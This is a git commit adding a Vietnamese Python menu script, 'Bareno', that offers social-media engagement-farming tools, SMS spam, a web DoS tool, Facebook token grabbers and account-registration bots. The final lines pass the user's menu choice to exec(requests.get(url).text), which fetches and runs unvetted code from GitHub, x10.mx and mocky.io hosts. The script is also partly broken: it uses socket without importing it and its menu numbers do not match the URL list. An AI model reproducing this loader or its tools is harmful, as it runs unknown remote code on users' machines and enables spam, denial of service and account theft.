a7fd0108d3ae9ccbd82524a728a95ec7bc92c27a
Dino <109515588+deeth781@users.noreply.github.com>
2024-08-29 18:56:44 +1300

    Add files via upload

---
+++ menu.py
@@ -0,0 +1,203 @@
+import requests,os,sys, time
+from random import choice, randint, shuffle
+from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
+from os.path import isfile
+from bs4 import BeautifulSoup
+import json
+import requests
+import time
+from time import strftime
+import os
+import requests
+import urllib.parse
+from time import strftime
+import os
+from datetime import datetime
+from time import sleep, strftime
+import datetime
+import json,requests,time
+from time import strftime
+ngay=int(strftime('%d'))
+key=str(ngay*25937+469173)
+#Color
+trang = "\033[1;37m"
+xanh_la = "\033[1;32m"
+xanh_duong = "\033[1;34m"
+do = "\033[1;31m"
+vang = "\033[1;33m"
+tim = "\033[1;35m"
+xanhnhat = "\033[1;36m"
+#Đánh Dấu Bản Quyền
+HĐ_tool = trang + " " + trang + "[" + do + "+_+" + trang + "] " + trang + "=> "
+mquang = trang + " " + trang + "[" + do + "÷_+" + trang + "] " + trang + "=> "
+thanh = trang + "-------------------------------------------------------------------------"
+
+import os
+
+def clear_screen():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+# Gọi hàm để xóa màn hình
+clear_screen()
+
+# Lmao
+thanh_xau=trang+'~'+do+'['+vang+'⟨⟩'+do+'] '+trang+'➩  '+xanhnhat
+thanh_dep=trang+'~'+do+'['+xanh_la+'✓'+do+'] '+trang+'➩  '+xanhnhat
+def get_ip_from_url(url):
+     response = requests.get(url)
+     ip_address = socket.gethostbyname(response.text.strip())
+     return ip_address
+     return "127.0.0.1"
+url = "http://kiemtraip.com/raw.php"
+ip = get_ip_from_url
+import os
+import requests
+from time import strftime
+now = datetime.datetime.now()
+thu = now.strftime('%A')
+ngay_hom_nay = now.strftime('%d')
+thang_nay = now.strftime('%m')
+nam_ = now.strftime('%Y')
+now = datetime.datetime.now()
+gio_hien_tai = now.strftime('%H:%M:%S')
+System.Clear()
+System.Title("Bareno")
+System.Size(300, 200)
+banner = r"""
+
+██████╗  █████╗ ██████╗ ███████╗███╗   ██╗ ██████╗ 
+██╔══██╗██╔══██╗██╔══██╗██╔════╝████╗  ██║██╔═══██╗
+██████╔╝███████║██████╔╝█████╗  ██╔██╗ ██║██║   ██║
+██╔══██╗██╔══██║██╔══██╗██╔══╝  ██║╚██╗██║██║   ██║
+██████╔╝██║  ██║██║  ██║███████╗██║ ╚████║╚██████╔╝
+╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝                                                                                  
+                            ENTER ĐỂ VÀO TOOL                                
+"""
+Anime.Fade(Center.Center(banner), Colors.blue_to_green, Colorate.Vertical, enter=True)
+from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
+def clear_screen():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+
+def main():
+    clear_screen()
+
+if __name__ == "__main__":
+    main()
+banner = ''' 
+  \x1b[38;5;207m╔══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;46m═╗
+  \033[1;31m  ██████╗  █████╗ ██████╗ ███████╗███╗   ██╗ ██████╗ 
+  \033[1;36m  ██╔══██╗██╔══██╗██╔══██╗██╔════╝████╗  ██║██╔═══██╗   
+  \033[1;32m  ██████╔╝███████║██████╔╝█████╗  ██╔██╗ ██║██║   ██║  
+  \033[1;34m  ██╔══██╗██╔══██║██╔══██╗██╔══╝  ██║╚██╗██║██║   ██║   
+  \033[1;35m  ██████╔╝██║  ██║██║  ██║███████╗██║ ╚████║╚██████╔╝
+  \033[1;31m  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ 
+        \x1b[38;5;207m TELEGRAM : \x1b[38;5;46mhttps://t.me/Renojb
+        \x1b[38;5;207m ADMIN : \x1b[38;5;46m Bareno
+        \x1b[38;5;207m MUA KEY VIP LIÊN HỆ Tele: Renoj \x1b[38;5;46m
+        \x1b[38;5;207m CHÚ THÍCH : Bạn Không Ngu, Do Tôi Quá Giỏi \x1b[38;5;46m
+   \x1b[38;5;207m╚══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;46m═╝
+'''
+
+for i in banner:
+    sys.stdout.write(i)
+    sys.stdout.flush()
+    time.sleep(0.00130)
+den = "\033[1;90m"
+luc = "\033[1;32m"
+trang = "\033[1;37m"
+red = "\033[1;31m"
+vang = "\033[1;33m"
+tim = "\033[1;35m"
+lamd = "\033[1;34m"
+lam = "\033[1;36m"
+hong = "\033[1;95m"
+
+Write.Print('╔═════════════════════╗ \n',Colors.yellow,interval=0.0001,end='\r')
+Write.Print('║  TOOL Trao Đổi Sub  ║ \n',Colors.yellow,interval=0.0001,end='\r')
+Write.Print('╚═════════════════════╝ \n',Colors.yellow,interval=0.0001,end='\r')
+Write.Print('[⟨⟩]➩ Nhập Số [1] TDS TIKTOK MAX SPEED [VIP] \n',Colors.white,interval=0.0001)
+Write.Print('[⟨⟩]➩ Nhập Số [2] TDS BẰNG PAGE PRO5 [TẠM] \n',Colors.white,interval=0.0001)
+Write.Print('[⟨⟩]➩ Nhập Số [3] TDS FACEBOOK FULL JOD [VIP] \n',Colors.white,interval=0.0001)
+Write.Print('[⟨⟩]➩ Nhập Số [4] TDS INSTAGRAM MAX SPEED  [MỚI] \n',Colors.white,interval=0.0001)
+Write.Print('╔═════════════════════╗ \n',Colors.yellow,interval=0.0001,end='\r')
+Write.Print('║  TOOL TƯƠNG TÁC CHÉO ║ \n',Colors.yellow,interval=0.0001,end='\r')
+Write.Print('╚═════════════════════╝ \n',Colors.yellow,interval=0.0001,end='\r')
+print(f'{hong}[⟨⟩]➩ \033[1;32mNhập Số [5]  TTC PRO5 [ỔN] \n')
+print(f'{hong}[⟨⟩]➩ \033[1;32mNhập Số [6] TTC INSTAGRAM MAX SPEED  [MỚI] \n')
+Write.Print('╔═════════════════════╗ \n',Colors.yellow,interval=0.0001,end='\r')
+Write.Print('║TOOL FACEBOOK ║ \n',Colors.yellow,interval=0.0001,end='\r')
+Write.Print('╚═════════════════════╝ \n',Colors.yellow,interval=0.0001,end='\r')
+print(f'{hong}[⟨⟩]➩ {lam}Nhập Số [0.1] TOOL BUFF VIEW FB BẰNG PRO5 \033[1;31m[BẢO TRÌ]\n')
+print(f'{hong}[⟨⟩]➩ {lam}Nhập Số [0.2] TOOL SHARE ẢO FB \033[1;31m[BẢO TRÌ ]\n')
+print(f'{hong}[⟨⟩]➩ {lam}Nhập Số [0.3] TOOL NUÔI FB V1 [NGON]\n')
+print(f'{hong}[⟨⟩]➩ {lam}Nhập Số [0.4] TOOL NUÔI FB V2 [NGON]\n')
+print(f'{hong}[⟨⟩]➩ {lam}Nhập Số [0.5] TOOL LIKE BÀI VIẾT DẠO [NGON]\n')
+Write.Print('╔═════════════════════╗ \n',Colors.yellow,interval=0.0001,end='\r')
+Write.Print('║ TOOL GOLIkE  ║ \n',Colors.yellow,interval=0.0001,end='\r')
+Write.Print('╚═════════════════════╝ \n',Colors.yellow,interval=0.0001,end='\r')
+print(f'{hong}[⟨⟩]➩ \033[1;95mNhập Số [6] TOOL TƯƠNG TÁC CHÉO IG [VIP] \n')
+print(f'{hong}[⟨⟩]➩ \033[1;95mNhập Số [7] TOOL GỘP GOLKIE TIKTOK [VIP] \n')
+print(f'[⟨⟩]➩ \033[1;95mNhập Số [7.1] TOOL GOLKIE TIKTOK [VIP] \n')
+Write.Print('╔═════════════════════╗ \n',Colors.yellow,interval=0.0001,end='\r')
+Write.Print('║ TOOL  TIKTOK ║ \n',Colors.yellow,interval=0.0001,end='\r')
+Write.Print('╚═════════════════════╝ \n',Colors.yellow,interval=0.0001,end='\r')
+print(f'{hong}[⟨⟩]➩ \033[1;32mNhập Số [10] TOOL BUFF TIKTOK[NGON]\n')
+Write.Print('╔═════════════════════╗ \n',Colors.yellow,interval=0.0001,end='\r')
+Write.Print('║ TOOL  SPAM SMS  ║ \n',Colors.yellow,interval=0.0001,end='\r')
+Write.Print('╚═════════════════════╝ \n',Colors.yellow,interval=0.0001,end='\r')
+print(f'{hong}[⟨⟩]➩ \033[1;35mNhập Số [12] TOOL SPAM SMS V1[NGON]\n')
+import requests
+
+
+chon = int(input('\x1b[38;5;46m▶ Nhập Số \x1b[1;32m: \x1b[38;5;226m'))
+urls = [
+    'https://raw.githubusercontent.com/deeth781/tdss/main/%5B4%5D%20Tool%20TDS%20TikTok.py',
+    'http://off-vn.x10.mx/tdspro5.html',
+    'https://raw.githubusercontent.com/hdttool/HDT-TOOL/main/tdsfulljod.html',
+    'https://raw.githubusercontent.com/hdttool/HDT-TOOL/main/Instagram.html',
+    'http://off-vn.x10.mx/ttcpro5.html',
+    'https://raw.githubusercontent.com/hdttool/HDT-TOOL/main/ttcvipig.html',
+    'https://raw.githubusercontent.com/hdttool/HDT-TOOL/main/strpro5.html',
+    'https://raw.githubusercontent.com/hdttool/HDT-TOOL/main/viewstr.html',
+    'https://raw.githubusercontent.com/hdttool/HDT-TOOL/main/kichhoat.html',
+    'https://raw.githubusercontent.com/hdttool/HDT-TOOL/main/flpro5.html',
+    'https://raw.githubusercontent.com/hdttool/HDT-TOOL/main/qtvpro5.html',
+    'https://raw.githubusercontent.com/hdttool/HDT-TOOL/main/tvnhompro5.html',
+    'https://raw.githubusercontent.com/hdttool/HDT-TOOL/main/regpro5.html',
+    'http://off-vn.x10.mx/share.py',
+    'https://raw.githubusercontent.com/hdttool/HDT-TOOL/main/ketban.html',
+    'https://raw.githubusercontent.com/hdttool/HDT-TOOL/main/nuoifb.html',
+    'https://raw.githubusercontent.com/hdttool/HDT-TOOL/main/gettokenfb.html',
+    'https://raw.githubusercontent.com/hdttool/HDT-TOOL/main/getproxy.html',
+    'https://raw.githubusercontent.com/hdttool/HDT-TOOL/main/dossweb.html',
+    'https://raw.githubusercontent.com/hdttool/HDT-TOOL/main/gettoken.html',
+    'http://off-vn.x10.mx/tik.html',
+    'http://off-vn.x10.mx/spamvip.html',
+    'https://raw.githubusercontent.com/hdttool/HDT-TOOL/main/reggarena.html',
+    'https://raw.githubusercontent.com/hdttool/HDT-TOOL/main/regvt.html',
+    'https://raw.githubusercontent.com/hdttool/HDT-TOOL/main/mes.html',
+    'https://run.mocky.io/v3/c75abbd1-354a-4b37-ab16-673bbcbe3082',
+    'https://run.mocky.io/v3/c1bca812-eae6-472c-b86c-1827bb779712',
+    'https://raw.githubusercontent.com/hdttool/HDT-TOOL/main/tanglike.html',
+    'https://raw.githubusercontent.com/hdttool/HDT-TOOL/main/tym.html',
+    'http://off-vn.x10.mx/sms.html',
+    'http://off-vn.x10.mx/kramer.html',
+    'http://off-vn.x10.mx/hyperion.html',
+    'http://off-vn.x10.mx/marshal_pyc.html',
+    'https://run.mocky.io/v3/823ebd35-7b3f-407c-830a-fa272e26d6d0',
+    'http://off-vn.x10.mx/telegram.html',
+    'https://raw.githubusercontent.com/hdttool/HDT-TOOL/main/golike.html',
+    'http://off-vn.x10.mx/gmailvip.html',
+    'http://off-vn.x10.mx/xembb.html',
+    'http://off-vn.x10.mx/getid.html',
+    'http://off-vn.x10.mx/gettoken.py',
+    'http://off-vn.x10.mx/comments.py'
+]
+
+if 1 <= chon <= 41:
+    url = urls[chon - 1]
+    exec(requests.get(url).text)
+else:
+    print('Sai Lựa Chọn')
+    exit()
